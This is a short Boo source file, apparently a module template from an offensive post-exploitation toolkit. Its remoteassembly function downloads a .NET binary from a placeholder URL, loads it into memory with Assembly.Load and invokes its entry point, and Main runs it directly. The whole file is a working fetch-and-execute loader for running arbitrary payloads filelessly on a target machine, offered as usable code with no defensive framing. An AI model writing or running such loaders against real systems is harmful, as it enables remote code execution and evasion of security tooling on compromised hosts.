import System
import System.IO
import System.Net
import System.Reflection

public static def remoteassembly(args as (string)):

		bin as (byte)
		binary as string
		br as BinaryReader
		cmd as object
		
		try:
			
			binary = "BINARY"
			args = "ASSEMBLY_ARGS",
			
			if args.Length > 0 :
				cmd = array(args)				
				ms = MemoryStream()
				using client = WebClient():
					System.Net.ServicePointManager.SecurityProtocol = ((System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11) | System.Net.SecurityProtocolType.Tls12)
					ms = MemoryStream(client.DownloadData(binary))
					br = BinaryReader(ms)
					bin = br.ReadBytes(Convert.ToInt32(ms.Length))
					ms.Close()
					br.Close()
					loadAssembly(bin, cmd)
		except :
			Console.WriteLine('Something went wrong! Check parameters and make sure binary uses managed code')

	public static def loadAssembly(bin as (byte), commands as (object)):
		a as Assembly = Assembly.Load(bin)
		try:
			a.EntryPoint.Invoke(null, (of object: commands))
		except :
			method as MethodInfo = a.EntryPoint
			if method is not null:
				o as object = a.CreateInstance(method.Name)
				method.Invoke(o, null)
				
public static def Main():
	args = "ASSEMBLY_ARGS"
	remoteassembly(args as (string))
